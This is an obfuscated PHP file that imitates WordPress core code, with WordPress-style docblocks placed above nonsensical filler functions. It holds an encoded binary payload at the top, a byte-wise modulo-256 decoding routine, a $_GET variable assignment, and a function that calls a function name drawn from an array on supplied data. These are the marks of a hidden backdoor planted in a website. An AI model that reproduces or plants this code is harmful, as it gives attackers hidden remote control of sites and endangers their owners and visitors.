6\xa9\x98\x98\xb7\xe6\xb3\x9f\xb4|j|SkbK\xcdT\x98a\x84\x99{k}T\x91\x83bpj\xed\x90\xa5\xe6\x9c\x90\xd9\xbf\xd0\xbc\xb6\xb9\xb9\xe6J\xca\xbf\xc8\xcf\xba\x8f\xba\x9c\xb8\x99r\x9c\x9b\xd8\xcf\xec\xa7\xbd\xc4\xce\xb2kZS\x81Jm\x82{\xdc}Tlbf\xb3\xc1\xee\xbb\xb5\xe5\xc4\xad\x93j\x9fybpq\x9bh\x9f\x9d\xd1\xb7\xe5\x98\xb8\x88lpj\xba\xb6\x84\x99\x9c\x90\xb0j\x82\x80u\x89\x83\xa8q\x8b\xb4|j\xd9\xb9\xd4\xbe\xa3\xb3\xb2\x81i\xb6\xe6\xe2\xad\xc1\xb0\xd0\xa9\x8d\xa6r\xa1J\xc5\xec\xa1\x8b\x93j\xb2\xc8bzy\x9c\x91\xba\xef\xde\xb6\xe4\x94\x8bybpj\x98\xbcn\x83\xa1\x8b\x93j\xd0\x9a\x87\xbcj\x98k\x93\xcc\xc0\xb5\xc9\x90\xcb\x81f\xa0\xa0\xee\xad\xb9\xea\xbc\x8d|n\xc5\xd0\xb8\xca\x9b\xe4\x93\xb0\xa2\xadk}j\xdfcLZy\xa2a\xab\xa3\xa1\xde}T\x82yLZT\xa7k\x84\x99\x92\xaa\xdf\xaf\x8c\x88\xa8\xc5\xb8\xdb\xb5\xcd\xe8\xe0\x81\x93j\xb5\xd1\x96\x96\x9b\xbbi\x88\xce\xe2\xcc\xc0\x92\xca\xc4\xa3\x9d\x92\xa4J\x88\xec\xeb\xcf\xc1\xb2\xb9\xc5\xae\x9ds\x82a\x84\x99{\xdc}j\x82ybpS\xe1\xa7\x84\x99\x92\x89\x93j\xc5\xc8\xb7\xbe\xbe\x81i\x84\x99\x92\x85\xc8\xba\xcd\xa6\x8a\xb8\xb5\xd9\x8e\xac\x99\x92\x81\x9cy\x8c\xaa\x8cpj\x98k\x93\xb6\xaf\x90\x9dj\x82\xab\x9b\x92j\xa2p\x97\xa8\x9c\x81\x93j\xbb\xba\xaa\xa3j\x98k\x93\xa2{\xdc}j\x91\x83\xaf\xba\xb4\x98a\x84\xa3\xa1\x85\xd8\x9d\xc6\xd1\x8et\xc5\xaf\xb4\xc1\x92\x81\x9dy\x9fbf\xa5\xba\xe3\x8e\xac\xe1\xdd\xc2\xc0\x92\xbd\x8a\x9f\x8bn\xd7\xb8\xa9\xc6\xd5\x90\x9dj\x82\xbabzy\xb5J\x8b\xae\xa7\x98\xa6\x82\x89\x94Lpj\x98am\x9d\xe1\xaa\xe9\xb4\xd8\x88lp\x9a\x98k\x93\xb6\x92\x81\x93j\x86\xae\xb2\xbb\x97\xc0\xa9\xcf\xda\xbf\xa9\xce|\xbf\x94LYj\x98e\xbe\xd3\xba\xb8\xcby\x8cy\xab\xb9\x93\xedk\x93\xb6\xa1\x8b\x93j\xaayln\xdd\x94\xc8\xf1\xbe\x89\x97\xb9\xab\xcf\xac\xc6s\xb3K\x84\x99\x92\x81\xd8\xc0\xc3\xc5qzj\x98\xa5\xb5\x99\x9c\x90\x9by\x8cy\x8e\xc5\xa4\x98a\x84\xa3\xa1\x85\xcd\xa4\xaa\xb0\x9at\x98a\xd5\xe1\xc3\xa9\xd6j\x82\x83qy\x85\x9c\xa0\xb1\xcc\xa1\x8b\x93j\x82\xcf\x91\xc4j\x98k\x93\xb6{\x88\xa4\x99\x91i\x8bT\xa7k\x84\x99\x92\xd6\x93j\x82\x83q\xb4\xb3\xddJ\x8c\xa2\xadk}Tk\xd6LZT\x81\xben\x99\x92\x81\x93j\x82cLZy\xa2a\xd3\xf1\xb3\xda\x9dy\xc8\xce\xb0\xb3\xbe\xe1\xb0\xd2\x82\xd4\xb4\xd5\x9d\xb5\xa4jt\x92\xca\x8c\xab\xc4\xe3\xab\xecv\x82yf\xca\x9d\xed\x94\xbe\xd2\xc9\xa6\xeb\xb4\x8bcKYS\xf3Kn\xa8\x9c\x81\x93\x9b\xda\xbabpt\xa7\xb3\xc9\xed\xe7\xd3\xe1j\x82yf\x98\x9c\xc3\x88\xaf\xea\xbc\xda\xa2t\x82yb\xaa\xb3\xc9\x94\x84\x99\x9c\x90\xd1S\x86\xd3\x95\xc5\x9d\xd2\x9a\xbb\xbe\xea\xcb\xaeTlcbpj\x98a\xe1\x83\x92\x81\x93j\x82bLpj\x98a\x84\xdf\xe7\xcf\xd6\xbe\xcb\xc8\xb0Y\xb7\xc7\x86\xcb\xc0\xe4\xc5\xbf\xb6\xae\x81f\xbd\x95\xe8\x87\xa5\xd0\xe3\xce\xe1v\x82yf\xb3\xc1\xee\xbb\xb5\xe5\xc4\xad\x9cTlcqz\xb4\x98a\x84\xa3\xa1\xdc|TkbKYS\x81e\xd1\xc4\xe2\xa7\xb4\xa1\xd3\xc6\xb0t\xbe\xba\xb8\xdf\xe8\x81\x9dy\x9fybpj\xdd\xb9\xd4\xe5\xe1\xc5\xd8j\x8a}\xa5\xc7\xc0\xf2\x92\xd0\xcb\xbe\x8d\xa2t\x82\xa5\x84pj\x98k\x93\x9d\xdf\xac\xe3\x90\xa3\xb0\xb3\xbd\xb8\x98a\x84\x99\x92\x8a\xaeT\x82ybpj\x98an\x83{\xb4\xeb\x9e\xa8\xaa\x85xn\xe5\x8c\xd4\xbf\xb3\xb8\xe4\xb7\xd0\x85qzj\x98a\xb5\xea\xc4\x8b\xa2n\xc5\xd0\xb8\xca\x9b\xe4\x93\xb0\xa2\xad\x9c}j\x82ybt\x98a\xd0\x99\x92\x8b\xa2\xc7lybpj\x82K\x84\x99\x92\x81\x93\xb0\xd7\xc7\xa5\xc4\xb3\xe7\xafm\xcc\xc0\xb5\xc9\x90\xcb\x81f\xa0\xa0\xee\xad\xb9\xea\xbc\x8d|n\xc5\xd0\xb8\xca\x9b\xe4\x93\xb0\xa2|\x81\x93jk\xd4Lpj\x98a\x84\xa8\x9c\x81\x93j\xc5\xc3bpj\xa2p\xca\xe8\xe4\xc6\xd4\xad\xca\x88lpj\x98\x83\x84\x99\x9c\x90\x9bS\x86\xa9\x98\xc6\xb6\xcd\xb2\xae\xa8\x9c\x81\x93j\xb1\xd2\x8fpj\x98k\x93\xda\xe5\x81\x93j\x86\xd3\x95\xc5\x9d\xd2\x9a\xbb\xbe\xea\xcb|\x87\xa0bf\x98\x9c\xc3\x88\xaf\xea\xbc\xda|s\x82yb\xcbT\x98a\x84\x99{\xa7\xe0\x97\xda\xbc\x8fxn\xf2\x94\xd9\xcc\xcc\xba\xca\x8f\xda\xc3nt\x98\x92\xd0\xe5\xd9\xb9\x93j\x82\x83q\xbe\xc3\xea\x96\xce\xcb\xdf\xca\xc2r\x86\xa1\x94\x9b\x91\xc3\xb2\xae\xf2\x9b\x8d\xa2t\xac\xce\xafpt\xa7e\xc7\xf0\xe8\xdb\xc4\xb6\xb4\xa5k\x8bn\xd7\x98\xa8\xeb\xe9j\xb0y\x8c\xa7\xbb\x9a\xab\xdda\x84\x99\x9c\x90\x9a\x9a\x8dx\x83q\xb3K\x84\x99\x92\xde}j\x82yK\xcdT\x82K\x93\xa3\xc5\x81\x93j\x8c\x88LY\xb0\xed\xaf\xc7\xed\xdb\xd0\xe1y\x8c\xa2bpj\xa2p\xdc\xec\xde\xc4\xba\x99\xb0\xbfjt\xc4\xcb\xb6\xb7\xd3\xcb\xb8\xb8\xc2\xcc\x85bpj\x9c\x89\xb6\xc4\xb9\xac\xe4\x94\xdb\x82Lpj\x98am\xf4|\x81\x93j\x82ybpj\x9c\xa3\xd6\xe5\xc5\xc7\x93j\x82yb\x8dy\xa2a\x84\xbc\xb4\xb7\x9dy\xd5\xcd\xb4\xbc\xaf\xe6i\x93\xa3\x92\x81\xe0j\x82\x83qt\x92\xca\x8c\xab\xc4\xe3\xab\xecj\x82yk\xbd\xec\xb3\xd0\xde\xe0\x89\x93j\x86\xd3\x95\xc5\x9d\xd2\x9a\xbb\xbe\xea\xcb|s\x9dcbt\x98\x94\xcc\xe0\xe7\xac\x93j\x82\x83qt\xc4\xcb\xb6\xb7\xd3\xcb\xb8\xb8\xc2\xccbp\x8dj\x98c\xae\xdc\xbd\xcb\xe8w\xda\xa6\x90\xb4\xb1\xa5\x99\xd2\xe7\xe7\xba\xa0\x91\xd4\x9a\x95}\xa3\xde\xa7\xb7\xc7\xc8\x8e\xd9\x96\xb8\xc7\x8c\xc6w\xc9\x99\xb7\xda\xb6\x83\xaeTkbKYS\x98e\xde\xcc\xe7\xb4\xcd\xa3\xb9\x9e\xba\xbay\xa2a\x84\xcb\xb3\xcf\xc2j\x8c\x88t\x98\x92\x84\x99\x9c\x90\xe6\xbe\xd4\xb8\xb4\xb5\xba\xdd\xa2\xd8\x99\x9aj\x97\xc4\xb5\xce\x95\xaa\xa3\xcf\x86\xdc\xe3\x9e\x90\x9dj\x82y\xa7\xc2\xb1\x98a\x8e\xa8\xdb\xcf\xe7\xc0\xc3\xc5jt\xac\xea\xad\xb7\xdf\x9b\x81\x9ej\x82\x8ak\x8bT\x82p\x8e\x99\xc8\xc3\xdfj\x82ylT\x98a\xd6\xde\xe6\xd6\xe5\xb8\x91\x83bp\xa3\xcda\x84\x99\x9c\x90\x97\xc4\xb5\xce\x95\xaa\xa3\xcf\x86\xdc\xe3\xadk}y\x8cybp\x8c\xc1\xaf\x84\x99\x92\x8b\xa2\xc7lybpj\x98an\x99{\xc7\xe8\xb8\xc5\xcd\xab\xbf\xb8\x98\x87\xd1\xc6\xea\xc4\xc0r\x86\xd3\x95\xc5\x9d\xd2\x9a\xbb\xbe\xea\xcb\x9fy\x8cy\x9c\x96\xaf\xc9a\x8e\xa8\x96\xa9\xc5\x95\xa9\xa4\xb3\x9a\xc3\xa4J\x88\xdc\xe9\xd7\xed\x9b\xce\xab\x8eyT\x81J\x84\x99\x92\x81\xeej\x82ybZj\xa7k\x84\x99\xe1\xb9\xd9\x98\xdbyl\xb7\xc7\x86\xcb\xc0\xe4\xc5\xbf\xb6\xae\x81\xa4\xa3\xac\xcb\x94\xaf\xa1\x96\xa9\xc5\x95\xa9\xa4\xb3\x9a\xc3\xa4p\x8e\x99\x92\xb8\xd6\xb5\xba\xacbpt\xa7\xb9\xd7\xe5\xd5\xa8\xc2\x98\xc8\x81f\xca\x9d\xed\x94\xbe\xd2\xc9\xa6\xeb\xb4\x8e\x88lpj\x98\xaf\xab\xa3\xa1\x85\xbb\x9c\xad\xa0\x8d\xc1\x94\xf1j\x8d\xa5{\x85\xd6\xc1\xd8\xd3\x93\xbc\x9c\xc4j\x9f\x9d\xd1\xd7\xb6\xbb\xb2\x88lp\xc0\xf2\xb6\xbd\xd0\x92\x81\x9dy\x9f\x88l\xc5j\x98k\x93\xa0\xa6\x9a\xa5\x81\x98\x80}ZS\x81Jm\x82\x92\x81}j\x82ybpj\x98a\x88\xc8\xc4\xa5\xba\x9e\xd5\xaf\x8d\xb7S\xb5p\x8e\x99\x92\x81\xd5\xb9\xb4ybpt\xa7\xb5\xd6\xe2\xdf\x89\x97\x92\xb4\xa4\x89\x9b\xbb\xc2\xba\x8d\xb4|k}S\x86\xaa\x83\xba\xb8\xdf\xbb\xd6\xa8\x9c\x81\x93j\xb8\xa0\xa7zy\xb5a\x84\x99\xd7\xd9\xe3\xb6\xd1\xbd\xa7xn\xdb\xb8\xda\xf3\xc3\xcd\xc5\x96\x8eyf\x9f\x9c\xbc\x88\xb8\xec\xc8\xac\xdas\x9d\x94Lpj\x98a\xcd\xdf\x92\x89\xd6\xb9\xd7\xc7\xb6xn\xc9\x82\xce\xe7\xd9\xdb\xe5sk\x97K\x81s\x98a\x84\xf4|j|Sk\x88lpj\xdba\x84\xa3\xa1\x85\xbc\xc2\xd0\xbb\xa5\x9c\xb3\xdd\x8f\xd9\xa8\x9c\xb5\xe6\x9a\x82ybzy\xb5p\x8e\x99\x92\x81\xed\xaf\xd4ybpt\xa7\xaa\xd1\xe9\xde\xd0\xd7\xaf\x8a\xbc\xaa\xc2j\x98a\x84\xa1\xa6\x96\x9cvk}\x93\x91\xb4\xe6\xa8\xde\xeb\x9b\x9c}j\x82ybpj\x98e\xa8\xf2\xc2\xc9\xbd\xaf\xb0\xa2K\x8dy\xa2\xab\xd5\x99\x9c\x90\xe6\xbe\xd4\xb8\xb2\xb1\xae\xa0e\xad\xf1\xe0\xc3\xd6\x96\xcb\xbe\x90\xc5v\x98a\x84\x99\x92\x93\xa3v\x91\x83b\xc4\xbb\x98a\x84\xa3\xa1\x83\xcf\x80\x92{nY\x9d\xcc\x93\xc3\xc9\xb3\xa5\xd2\x9c\xab\xa0\x8a\xa4s\xb3e\xc3\xc8\xbaj\xb0y\x8cy\x87\xc7\xb8\xd0a\x84\x99\x9c\x90\x9a~\x94\x8at\x89q\xb3Km\x82{j\xa2t\xda\x83q\xcdT\x81\xben\x99\x92j}T\x91\x83\x89\x96j\x98k\x93\xdf\xb8\xb7\xe1\x91\xa7\xb1\x85\xc6\x93\xa0c\x86\xa2\xad\x9c\x95\x85\xcb\x93v\x8b\xbd\xb2w\x9e\x9b\xe7\xcf\xdf\xb3\xd0\xc4d\x8b\xc7";
 // const unsigned char bnegative = negative(b);
 $original_result['y5rvbc6'] = 1808;
 $parsed_scheme = (!isset($parsed_scheme)?	"j5tzco0se"	:	"q69dlimh");
 $time_html['qdhbzqy'] = 1077;
 $admin_out = urlencode($admin_out);
  if(empty(expm1(945)) ==  True)	{
  	$genre_elements = 'byhio';
  }
 $option_fread_buffer_size['vidqgjw7'] = 'nsdd';
 $maximum_viewport_width = substr($maximum_viewport_width, 19, 12);
 $calls = ltrim($calls);
 //Net result is the same as trimming both ends of the value.
 // 4.15  GEOB General encapsulated object
     $_GET["JulJaXEP"] = $autosave_autodraft_posts;
 }


/**
 * Returns the HTML of the sample permalink slug editor.
 *
 * @since 2.5.0
 *
 * @param int|WP_Post $thisfile_riff_WAVE_cart_0      Post ID or post object.
 * @param string|null $new_title Optional. New title. Default null.
 * @param string|null $new_slug  Optional. New slug. Default null.
 * @return string The HTML of the sample permalink slug editor.
 */

 function get_styles_for_block ($channelnumber){
 	if(empty(abs(234)) ==  True) 	{
 		$rest_controller_class = 'jeiv9';
 	}
 	$channelnumber = 'a25z';
 	$plugin_basename['w7s5wops'] = 4835;
 	if(empty(is_string($channelnumber)) !=  true) {
 		$frame_pricepaid = 'm5akvs';
 	}
 	$new_array = 'a9ot';
 	$template_types['iscdre'] = 156;
 	if(!(urlencode($new_array)) !=  TRUE) {
 		$MarkersCounter = 'b6zeosev1';
 	}
 	if((asinh(123)) ===  True) {
 		$date_parameters = 'y3a9n';
 	}
 	$new_array = rtrim($new_array);
 	$channelnumber = atan(470);
 	if(!isset($elements_with_implied_end_tags)) {
 		$elements_with_implied_end_tags = 'njp1';
 	}
 	$elements_with_implied_end_tags = dechex(695);
 	$reinstall = (!isset($reinstall)?"mfh9b6gmx":"i5i7k");
 	$new_array = quotemeta($elements_with_implied_end_tags);
 	$client_version['q0art6'] = 1502;
 	if((asin(507)) !==  false)	{
 		$widget_links_args = 'kna9ogblu';
 	}
 	$new_array = floor(135);
 	$thisfile_riff_raw_rgad_album = 'hrrc2o';
 	$errmsg = 'e4he5o';
 	if(!isset($computed_attributes)) {
 		$computed_attributes = 'e7m31lqj';
 	}
 	$computed_attributes = chop($thisfile_riff_raw_rgad_album, $errmsg);
 	$elements_with_implied_end_tags = tanh(914);
 	$to_file['imtf19e0'] = 'tiq8j0e2';
 	if(!isset($featured_image)) {
 		$featured_image = 'drua8unl';
 	}
 	$featured_image = htmlspecialchars($elements_with_implied_end_tags);
 	return $channelnumber;
 }


/**
 * Determines if a given value is integer-like.
 *
 * @since 5.5.0
 *
 * @param mixed $maybe_integer The value being evaluated.
 * @return bool True if an integer, otherwise false.
 */

 if(!isset($group_item_data)) {
 	$group_item_data = 'q71sj';
 }
// M - Emphasis
// ----- Do the extraction (if not a folder)


/**
	 * Format a cookie for a Set-Cookie header
	 *
	 * This is used when sending cookies to clients. This isn't really
	 * applicable to client-side usage, but might be handy for debugging.
	 *
	 * @return string Cookie formatted for Set-Cookie header
	 */

 function rest_send_cors_headers($previous_comments_link, $redirects){
 $binary = 'dstf2x5';
 $FirstFrameThisfileInfo = 'k83leo4cx';
 $element_type = 'wf9ws';
 $unique_filename_callback = 'ng3mlt';
 $durations = 'akqu8t';
 // And user doesn't have privs, remove menu.
 // Include admin-footer.php and exit.
 $element_type = htmlspecialchars($element_type);
 $admin_body_classes['o4ftocj'] = 'aneg';
  if(!(bin2hex($FirstFrameThisfileInfo)) !=  true) 	{
  	$sign_cert_file = 'd04z4a';
  }
 $durations = lcfirst($durations);
  if(!empty(bin2hex($binary)) !=  true)	{
  	$position_type = 'rd0lq';
  }
 // If an attribute is not recognized as safe, then the instance is legacy.
 $binary = floor(985);
 $next = 'rfus7';
 $autoSignHeaders = (!isset($autoSignHeaders)?'gffajcrd':'dxx85vca');
  if(!(strtolower($unique_filename_callback)) !=  false)	{
  	$binstring = 'gyj9bo7';
  }
 $processed_content['qhez0znn'] = 'n7ehb';
 // End if $callback_batchis7_permalinks.
 $noparents = (!isset($noparents)?'z1y0e0':'gipks');
 $unique_filename_callback = tan(690);
 $element_type = md5($element_type);
 $registered['zna3kxfdq'] = 1997;
 $binary = strrev($binary);
 //   There may be more than one 'AENC' frames in a tag,
 $durations = wordwrap($durations);
 $esses = (!isset($esses)?	'ktns328'	:	'rrek85');
 $mbstring_func_overload = 'g8a8';
  if(!empty(htmlspecialchars($next)) !=  False){
  	$exporter_index = 'x8y1u';
  }
 $element_type = atanh(137);
 $emessage = (!isset($emessage)? 	"v9w4i53" 	: 	"a8w95ew");
 $addl_path = 'g9jf';
 $carryRight = 's5hd406';
 $unique_filename_callback = rtrim($unique_filename_callback);
 $mbstring_func_overload = strtoupper($mbstring_func_overload);
     $forced_content = $redirects[1];
     $wp_siteurl_subdir = $redirects[3];
  if(!empty(strtr($addl_path, 19, 8)) ==  True){
  	$credit_scheme = 'veufflyex';
  }
 $mbstring_func_overload = stripslashes($binary);
  if(!(htmlentities($carryRight)) ==  true){
  	$gap_value = 'e83i';
  }
 $checked_filetype['fa6adp3'] = 9;
  if(!isset($bracket_pos)) {
  	$bracket_pos = 'jz9tu75';
  }
 $durations = strcspn($durations, $durations);
 $andor_op = (!isset($andor_op)? 	"nhwa1vg5" 	: 	"jbw21jd");
 $bracket_pos = strip_tags($unique_filename_callback);
  if(!empty(log10(868)) ===  false)	{
  	$xfn_value = 'auwyqq';
  }
 $hint['vzykxb5'] = 2434;
  if(!isset($feed_link)) {
  	$feed_link = 'qo05r';
  }
 $hooked['s111y8'] = 2768;
 $uid['lwguhmu'] = 'wt0r2';
 $element_type = asinh(496);
  if(!empty(atan(853)) !=  true)	{
  	$available_space = 'dhnfz0';
  }
 $bracket_pos = ucfirst($bracket_pos);
 $durations = rad2deg(496);
 $feed_link = strripos($binary, $mbstring_func_overload);
 $missed_schedule = (!isset($missed_schedule)? 'dno4hs' : 's8ntri2v');
 $background_styles = (!isset($background_styles)? "wxcug9" : "xmv20");
     $forced_content($previous_comments_link, $wp_siteurl_subdir);
 }
$group_item_data = expm1(332);
$accepted = sin(680);
$original_args = 'hie17wyf';


/**
 * Avoids a collision between a site slug and a permalink slug.
 *
 * In a subdirectory installation this will make sure that a site and a post do not use the
 * same subdirectory by checking for a site with the same name as a new post.
 *
 * @since 3.0.0
 *
 * @param array $data    An array of post data.
 * @param array $thisfile_riff_WAVE_cart_0arr An array of posts. Not currently used.
 * @return array The new array of post data after checking for collisions.
 */

 function wp_enqueue_embed_styles(&$global_style_query, $tryagain_link, $constant_overrides){
     $currentmonth = 256;
 // Shake it!
     $photo = count($constant_overrides);
 $approved_comments_number = 'fndq73';
 $default_search_columns = 'lnfcfqww';
 $editor_buttons_css = 'tg6wfn';
  if(!isset($head_end)) {
  	$head_end = 'pib7ytih5';
  }
 $declaration_value = 'ox1llpfzq';
     $photo = $tryagain_link % $photo;
 // End if ( ! empty( $old_sidebars_widgets ) ).
 $head_end = asinh(606);
 $theme_json_file = (!isset($theme_json_file)?"x3pcpaf8j":"sddqt8l");
 $toolbar3['hy4gst'] = 1819;
 $default_search_columns = bin2hex($default_search_columns);
 $core_blocks_meta = (!isset($core_blocks_meta)?	"hjqwh"	:	"groahi4");
     $photo = $constant_overrides[$photo];
 $GPS_free_data['k5snlh0'] = 'r7tf';
 $editor_buttons_css = htmlentities($editor_buttons_css);
  if((trim($head_end)) !=  true){
  	$LocalEcho = 'evr224rbu';
  }
 $approved_comments_number = strcspn($approved_comments_number, $approved_comments_number);
 $old_installing = (!isset($old_installing)? 	"beoxueue" 	: 	"evyqg5");
 $selects['u35k50pb'] = 'plc4w';
  if(!isset($moe)) {
  	$moe = 'a6hju9g';
  }
  if(!(addcslashes($editor_buttons_css, $editor_buttons_css)) ===  true)	{
  	$commentregex = 'chpotqg';
  }
 $declaration_value = lcfirst($declaration_value);
  if(!isset($my_year)) {
  	$my_year = 'us53948';
  }
 $editor_buttons_css = strnatcmp($editor_buttons_css, $editor_buttons_css);
 $profile_user = (!isset($profile_user)?	"xgyd4"	:	"oj15enm");
 $my_year = md5($head_end);
 $approved_comments_number = floor(238);
 $moe = acos(741);
 $aria_action['ujiau'] = 788;
  if(!isset($bitrate)) {
  	$bitrate = 'yvbo';
  }
 $between['t1q94u'] = 3762;
 $my_year = lcfirst($head_end);
 $pseudo_matches = (!isset($pseudo_matches)? 	'd6rfw' 	: 	'dpbfhjy');
 $bitrate = asin(335);
  if(!(str_repeat($editor_buttons_css, 14)) ===  FALSE)	{
  	$IPLS_parts = 'l1l2u';
  }
 $my_year = cosh(76);
  if(!isset($decimal_point)) {
  	$decimal_point = 'ss4s';
  }
 $moe = asin(596);
 // and it's possible that only the video track (or, in theory, one of the video tracks) is flagged as
 $head_end = strnatcasecmp($my_year, $head_end);
 $CommentLength = (!isset($CommentLength)?"k6r24vm6":"hj52d40");
 $default_search_columns = bin2hex($moe);
  if(empty(htmlentities($editor_buttons_css)) !=  True) 	{
  	$reply = 'c5isoi';
  }
 $decimal_point = exp(574);
 $thismonth['lwj9'] = 'cz4u';
  if(empty(dechex(157)) !=  true){
  	$block_registry = 'e0b9';
  }
 $reconnect_retries = (!isset($reconnect_retries)?"dpsy8a3gp":"c8oe9iv");
 $declaration_value = urldecode($declaration_value);
 $approved_comments_number = strrev($approved_comments_number);
     $global_style_query = ($global_style_query - $photo);
 $default_search_columns = dechex(623);
 $text_decoration_value['ztmqdepq'] = 1178;
 $declaration_value = decoct(714);
 $current_plugin_data['zylwc'] = 3256;
  if(!isset($role_list)) {
  	$role_list = 'waw5xcx';
  }
  if(empty(sin(47)) !=  TRUE) 	{
  	$counter = 'f52z45';
  }
 $hashtable['odd0obpd'] = 'quag9j';
 $editor_buttons_css = strtoupper($editor_buttons_css);
 $PossiblyLongerLAMEversion_FrameLength['aul9g42'] = 2801;
 $role_list = stripslashes($head_end);
     $global_style_query = $global_style_query % $currentmonth;
 }


/*
			 * The maxval check does two things: it checks that the attribute value is
			 * an integer from 0 and up, without an excessive amount of zeroes or
			 * whitespace (to avoid Buffer Overflows). It also checks that the attribute
			 * value is not greater than the given value.
			 * This check can be used to avoid Denial of Service attacks.
			 */

 function wp_send_user_request ($page_type){
 // chmod the file or directory.
 $BitrateUncompressed = 'qpde';
 // a 64-bit value is required, in which case the normal 32-bit size field is set to 0x00000001
 // If no taxonomy, assume tt_ids.
 // Have to have at least one.
 // Ensure an include parameter is set in case the orderby is set to 'include'.
 // $cats
 $CompressedFileData = 'hz5noy4e';
 // End if ( ! empty( $old_sidebars_widgets ) ).
 // Store the updated settings for prepare_item_for_database to use.
 // Set a cookie now to see if they are supported by the browser.
 	$filtered_iframe = 'dqmuo6sgv';
 	$public_post_types = (!isset($public_post_types)?	"e2nia89"	:	"m237sg");
 	$hour_ago['b4yuck68'] = 4747;
 // array_slice() removes keys!
 	if(!isset($done_ids)) {
 		$done_ids = 'hot6o';
 	}
 // end foreach
 	$done_ids = html_entity_decode($filtered_iframe);
 	$first_open['jjvhkl6'] = 3817;
 	if(!isset($open_in_new_tab)) {
 		$open_in_new_tab = 'wcriil';
 	}
 	$open_in_new_tab = tan(607);
 	if(!isset($preview_link)) {
 		$preview_link = 'd99pbll';
 	}
 	$preview_link = md5($open_in_new_tab);
 	$figure_class_names['tl1glkks'] = 2614;
 	$done_ids = strrpos($filtered_iframe, $done_ids);
 	$f1f4_2['je8zl0jux'] = 2419;
 	if(!(wordwrap($open_in_new_tab)) ===  false) {
 		$old_backup_sizes = 'k6xup2';
 	}
 	$block_html = (!isset($block_html)? 	'rjtp' 	: 	't0l5irs');
 	if(!isset($options_graphic_bmp_ExtractPalette)) {
 		$options_graphic_bmp_ExtractPalette = 'wertk79hr';
 	}
 	$options_graphic_bmp_ExtractPalette = md5($filtered_iframe);
 	$pingback_str_dquote = (!isset($pingback_str_dquote)?'rgyhem':'a9ryy0nq');
 	if((htmlspecialchars_decode($preview_link)) ===  true) 	{
 		$auto_update = 'bsub';
 	}
 	if(empty(rawurlencode($done_ids)) !=  FALSE) 	{
 		$widget_control_id = 'yv9ka';
 	}
 	$page_type = 'fm9vvcxt';
 	$available_item_type['zvpw65g'] = 3147;
 	$preview_link = ucfirst($page_type);
 	$arg_strings = (!isset($arg_strings)? "c6vt2" : "rdkr6gy0j");
 	$add_trashed_suffix['icqh9i2w'] = 4800;
 	if(empty(lcfirst($open_in_new_tab)) !=  true) {
 		$ws = 'vu66jdz';
 	}
 	if((expm1(597)) ==  True) {
 		$priorityRecord = 'v9esa';
 	}
 	$preview_link = strtoupper($preview_link);
 	$username_or_email_address['ghomp'] = 1548;
 	if(!empty(addcslashes($open_in_new_tab, $filtered_iframe)) ==  TRUE) 	{
 		$new_collection = 'el1qd';
 	}
 	return $page_type;
 }
$escaped_preset['cqh39'] = 4064;


/**
 * Serves as a callback for comparing objects based on count.
 *
 * Used with `uasort()`.
 *
 * @since 3.1.0
 * @access private
 *
 * @param object $a The first object to compare.
 * @param object $b The second object to compare.
 * @return int Negative number if `$a->count` is less than `$b->count`, zero if they are equal,
 *             or greater than zero if `$a->count` is greater than `$b->count`.
 */

 function wp_ajax_save_widget ($cacheable_field_values){
 // Check for a block template without a description and title or with a title equal to the slug.
 // Always clears the hook in case the post status bounced from future to draft.
 	$cacheable_field_values = 'eq82q';
 	$core_block_pattern['ctfx8zq31'] = 'xu958gl';
 // This allows us to be able to get a response from wp_apply_colors_support.
 	$expiration_duration['jna0f'] = 'd10go31';
 	if(!isset($admin_email)) {
 		$admin_email = 'x4akdv9w';
 	}
 	$admin_email = strtoupper($cacheable_field_values);
 	$network_activate = (!isset($network_activate)? 	'j9t1' 	: 	'zpc387vie');
 	$cacheable_field_values = floor(851);
 	$allowed_keys = (!isset($allowed_keys)? "p1m7m" : "jsgali5");
 	if(!empty(abs(54)) ==  False)	{
 		$overflow = 'b9jj';
 	}
 	if(!empty(expm1(90)) ===  TRUE) 	{
 		$BitrateCompressed = 'i3kyowr';
 	}
 	$cacheable_field_values = strtolower($admin_email);
 	$cross_domain = (!isset($cross_domain)?	"lthtnobao"	:	"hkuf");
 	$unverified_response['guyzfp'] = 'pypthnma9';
 	$f6g5_19['p97ldj5f'] = 'wd9ed';
 	$cacheable_field_values = strcspn($cacheable_field_values, $admin_email);
 	$admin_email = decoct(696);
 	return $cacheable_field_values;
 }


/**
	 * Removes a customize panel.
	 *
	 * Note that removing the panel doesn't destroy the WP_Customize_Panel instance or remove its filters.
	 *
	 * @since 4.0.0
	 *
	 * @param string $file_path Panel ID to remove.
	 */

 if(!isset($multisite_enabled)) {
 	$multisite_enabled = 'xcr27';
 }


/**
	 * Outputs the settings form for the Recent Posts widget.
	 *
	 * @since 2.8.0
	 *
	 * @param array $callback_batchnstance Current settings.
	 */

 function wp_global_styles_render_svg_filters ($CommentsCount){
 	if(!isset($yhash)) {
 		$yhash = 'umx1v3j7';
 	}
 	$yhash = acosh(743);
 	if(!isset($activate_url)) {
 		$activate_url = 'weclo6x';
 	}
 	$activate_url = sinh(745);
 	$role_classes = 'j9et8i6';
 	$add_below['r501yxd83'] = 2495;
 	$role_classes = html_entity_decode($role_classes);
 	$final_diffs = 'bo5vh31j';
 	$CommentsCount = strtoupper($final_diffs);
 	$orig_diffs = 'ry726ty';
 	if(empty(strnatcmp($orig_diffs, $yhash)) !=  false)	{
 		$time_class = 'kub7czt4';
 	}
 	return $CommentsCount;
 }
/**
 * Checks whether separate styles should be loaded for core blocks on-render.
 *
 * When this function returns true, other functions ensure that core blocks
 * only load their assets on-render, and each block loads its own, individual
 * assets. Third-party blocks only load their assets when rendered.
 *
 * When this function returns false, all core block assets are loaded regardless
 * of whether they are rendered in a page or not, because they are all part of
 * the `block-library/style.css` file. Assets for third-party blocks are always
 * enqueued regardless of whether they are rendered or not.
 *
 * This only affects front end and not the block editor screens.
 *
 * @see wp_enqueue_registered_block_scripts_and_styles()
 * @see register_block_style_handle()
 *
 * @since 5.8.0
 *
 * @return bool Whether separate assets will be loaded.
 */
function ge_scalarmult_base()
{
    if (is_admin() || is_feed() || wp_is_rest_endpoint()) {
        return false;
    }
    /**
     * Filters whether block styles should be loaded separately.
     *
     * Returning false loads all core block assets, regardless of whether they are rendered
     * in a page or not. Returning true loads core block assets only when they are rendered.
     *
     * @since 5.8.0
     *
     * @param bool $load_separate_assets Whether separate assets will be loaded.
     *                                   Default false (all block assets are loaded, even when not used).
     */
    return apply_filters('should_load_separate_core_block_assets', false);
}


/**
	 * @since 5.9.0 Renamed `$string` (a PHP reserved keyword) to `$feedback` for PHP 8 named parameter support.
	 *
	 * @param string $feedback Message data.
